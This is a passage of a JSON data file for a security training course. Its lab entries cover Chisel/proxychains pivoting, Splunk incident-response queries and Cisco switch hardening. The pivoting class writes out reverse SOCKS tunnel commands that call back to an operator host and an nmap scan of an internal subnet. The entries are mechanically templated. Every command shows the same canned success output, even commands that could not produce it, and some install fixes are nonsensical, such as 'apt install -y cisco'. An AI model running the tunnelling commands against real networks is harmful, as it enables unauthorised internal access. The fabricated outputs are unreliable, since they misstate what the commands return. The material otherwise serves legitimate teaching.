        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y bloodhound."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 15,
    "week": 8,
    "classNumber": 15,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 8: Post-Exploitation & Blue Team Pivot",
    "title": "Pivoting & Lateral Movement",
    "category": "Lateral Movement",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Establish multi-hop proxies to access internal assets that are not publicly exposed.",
    "tools": [
      "Proxychains",
      "Chisel",
      "SOCKS5"
    ],
    "targetEnvironment": "Dual-homed Linux server (public/internal)",
    "topology": {
      "description": "Lab topology for Pivoting & Lateral Movement",
      "nodes": [
        {
          "id": "source",
          "label": "Proxychains",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Dual-homed",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Lateral Movement",
        "explanation": "Establish multi-hop proxies to access internal assets that are not publicly exposed."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Pivoting & Lateral Movement",
        "description": "Verify system connectivity and tool installation in Dual-homed Linux server (public/internal).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "chisel server -p 8080 --reverse &",
            "description": "Execute chisel command",
            "output": "[+] Command executed successfully.\nOutput: Internal subnet 10.0.0.0/24 successfully scanned and accessed through the SOCKS proxy."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Pivoting & Lateral Movement",
        "description": "Establish a remote session on a dual-homed host that links a public network to a private internal network tier. Configure a Chisel proxy connection to set up an inline reverse SOCKS tunnel. Modify the local attacker configuration (/etc/proxychains4.conf) to launch internal Nmap tools inside the hidden segment.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "./chisel client 192.168.1.50:8080 R:socks &",
            "description": "Execute ./chisel command",
            "output": "[+] Command executed successfully.\nOutput: Internal subnet 10.0.0.0/24 successfully scanned and accessed through the SOCKS proxy."
          },
          {
            "shell": "bash",
            "cmd": "head -n 3 /etc/proxychains4.conf",
            "description": "Execute head command",
            "output": "[+] Command executed successfully.\nOutput: Internal subnet 10.0.0.0/24 successfully scanned and accessed through the SOCKS proxy."
          },
          {
            "shell": "bash",
            "cmd": "proxychains nmap -sT -Pn -p 22,80,445 10.0.0.15",
            "description": "Execute proxychains command",
            "output": "[+] Command executed successfully.\nOutput: Internal subnet 10.0.0.0/24 successfully scanned and accessed through the SOCKS proxy."
          }
        ],
        "verification": "Internal subnet 10.0.0.0/24 successfully scanned and accessed through the SOCKS proxy.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Dual-homed Linux server (public/internal)",
          "Proxychains",
          "Internal subnet 10.0.0.0/24 successfully...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why can SYN scans (-sS) not be run through a SOCKS proxy via proxychains?",
        "hint": "SOCKS proxies operate at Layer 5/7 (TCP connect), requiring complete socket creation (-sT)."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Pivoting & Lateral Movement?",
      "options": [
        "Establish multi-hop proxies to access internal assets that are not publicly exposed.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Establish multi-hop proxies to access internal assets that are not publicly exposed."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 15.",
    "eli5Story": {
      "title": "The Secret Walkie-Talkie Tunnel (Chisel Pivoting)",
      "analogy": "You are inside a room with a closed metal vault. But your friend has one hand inside the vault and one hand in the hallway. You hand them a walkie-talkie so you can talk straight into the vault!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 15",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Proxychains",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Dual-homed Linux server (public/internal)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Proxychains"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y proxychains."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 16,
    "week": 8,
    "classNumber": 16,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 8: Post-Exploitation & Blue Team Pivot",
    "title": "Log Analysis & Incident Response",
    "category": "Incident Response",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Parse data footprints left by attacker vectors inside network traffic repositories.",
    "tools": [
      "Splunk",
      "Snort",
      "SPL"
    ],
    "targetEnvironment": "Splunk-integrated VM",
    "topology": {
      "description": "Lab topology for Log Analysis & Incident Response",
      "nodes": [
        {
          "id": "source",
          "label": "Splunk",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Splunk-integrated",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Incident Response",
        "explanation": "Parse data footprints left by attacker vectors inside network traffic repositories."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Log Analysis & Incident Response",
        "description": "Verify system connectivity and tool installation in Splunk-integrated VM.",
        "commands": [
          {
            "shell": "splunk",
            "cmd": "index=web_logs sourcetype=access_combined status=200",
            "description": "Execute index=web_logs command",
            "output": "[+] Command executed successfully.\nOutput: Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Log Analysis & Incident Response",
        "description": "Set up a standalone Splunk instance. Ingest raw Apache application logs and Snort signature alert strings captured during the web attacks executed in Week 4. Construct Search Processing Language (SPL) filters to map the threat timeline and identify the adversary's IP address.",
        "commands": [
          {
            "shell": "splunk",
            "cmd": "| stats count by clientip, uri",
            "description": "Execute | command",
            "output": "[+] Command executed successfully.\nOutput: Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed."
          },
          {
            "shell": "splunk",
            "cmd": "| sort -count",
            "description": "Execute | command",
            "output": "[+] Command executed successfully.\nOutput: Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed."
          },
          {
            "shell": "splunk",
            "cmd": "index=snort_alerts | stats count by signature, src_ip, dest_ip",
            "description": "Execute index=snort_alerts command",
            "output": "[+] Command executed successfully.\nOutput: Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed."
          },
          {
            "shell": "splunk",
            "cmd": "index=web_logs uri=\"*OR*\" OR uri=\"*alert*\" | table _time, clientip, uri, status",
            "description": "Execute index=web_logs command",
            "output": "[+] Command executed successfully.\nOutput: Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed."
          }
        ],
        "verification": "Adversary reconnaissance, SQL injection, and payload execution timeline cleanly reconstructed.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Splunk-integrated VM",
          "Splunk",
          "Adversary reconnaissance, SQL injection,...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is log timestamp synchronization (NTP) critical for forensic investigations?",
        "hint": "Unsynced clocks make correlating event streams across perimeter firewalls and servers impossible."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Log Analysis & Incident Response?",
      "options": [
        "Parse data footprints left by attacker vectors inside network traffic repositories.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Parse data footprints left by attacker vectors inside network traffic repositories."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 16.",
    "eli5Story": {
      "title": "The Security Camera Playback Machine (Splunk Log Analysis)",
      "analogy": "Splunk is like having a giant TV room that records every footprint, open door, and light switch so detectives can rewind time and watch exactly who stole the cookies!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 16",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Splunk",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Splunk-integrated VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Splunk"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y splunk."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 17,
    "week": 9,
    "classNumber": 17,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 9: Layer 2 Switch Hardening",
    "title": "Securing the Management Plane",
    "category": "Switch Hardening",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Lock down structural terminal lines to deny unencrypted administrative connections.",
    "tools": [
      "Cisco Packet Tracer",
      "SSHv2",
      "Cisco IOS"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 Switch, 1 Admin PC",
    "topology": {
      "description": "Lab topology for Securing the Management Plane",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Switch Hardening",
        "explanation": "Lock down structural terminal lines to deny unencrypted administrative connections."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Securing the Management Plane",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 Switch, 1 Admin PC.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Securing the Management Plane",
        "description": "Open Cisco Packet Tracer and build a switch-to-administrator topology. Disable baseline cleartext operational access models (Telnet/HTTP). Configure local database profiles, mandate SSHv2 execution, set up aggressive shell timeouts, and implement the login block-for lockout parameter.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "hostname SW-CORE",
            "description": "Execute hostname command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "ip domain-name enterprise.local",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "crypto key generate rsa modulus 2048",
            "description": "Execute crypto command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "ip ssh version 2",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "username admin secret Cisco@Sec2026",
            "description": "Execute username command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "line vty 0 4",
            "description": "Execute line command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "transport input ssh",
            "description": "Execute transport command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "login local",
            "description": "Execute login command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "exec-timeout 5 0",
            "description": "Execute exec-timeout command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "login block-for 120 attempts 3 within 60",
            "description": "Execute login command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout."
          }
        ],
        "verification": "Telnet connection refused; SSHv2 connection succeeds; 3 failed logins triggers 120s lockout.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 Switch, 1 Admin PC",
          "Cisco Packet Tracer",
          "Telnet connection refused; SSHv2 connect...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is Telnet strictly prohibited in enterprise management planes?",
        "hint": "Telnet transmits administrative login passwords in unencrypted plaintext frames."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Securing the Management Plane?",
      "options": [
        "Lock down structural terminal lines to deny unencrypted administrative connections.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Lock down structural terminal lines to deny unencrypted administrative connections."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 17.",
    "eli5Story": {
      "title": "The Magic Password Door to the Switch (Management Plane Hardening)",
      "analogy": "If you don't lock the switch management door, anyone walking by can plug in and change the rules. We install strong SSHv2 locks and automatic timeout alarms."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 17",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 Switch, 1 Admin PC"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 18,
    "week": 9,
    "classNumber": 18,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 9: Layer 2 Switch Hardening",
    "title": "Port Security & MAC Layer Defense",
    "category": "Switch Hardening",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Bind hardware interfaces to specific host identifiers to eliminate access layer spoofing.",
    "tools": [
      "Cisco Packet Tracer",
      "Port Security"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 Switch, 2 PCs, 1 Rogue PC",
    "topology": {
      "description": "Lab topology for Port Security & MAC Layer Defense",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Switch Hardening",
        "explanation": "Bind hardware interfaces to specific host identifiers to eliminate access layer spoofing."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Port Security & MAC Layer Defense",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 Switch, 2 PCs, 1 Rogue PC.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Port Security & MAC Layer Defense",
        "description": "Configure access ports across an enterprise network switch with Sticky port security models (switchport port-security mac-address sticky). Define maximum host thresholds to 1 and change violation rules to shutdown. Attach a non-authorized endpoint node and verify interface transitioning into an err-disabled status.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "interface FastEthernet0/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "switchport mode access",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "switchport port-security",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "switchport port-security maximum 1",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "switchport port-security mac-address sticky",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "switchport port-security violation shutdown",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "errdisable recovery cause psecure-violation",
            "description": "Execute errdisable command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "errdisable recovery interval 300",
            "description": "Execute errdisable command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          },
          {
            "shell": "cisco",
            "cmd": "show port-security interface FastEthernet0/1",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately."
          }
        ],
        "verification": "Connecting rogue laptop triggers violation; port transitions to err-disabled state immediately.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
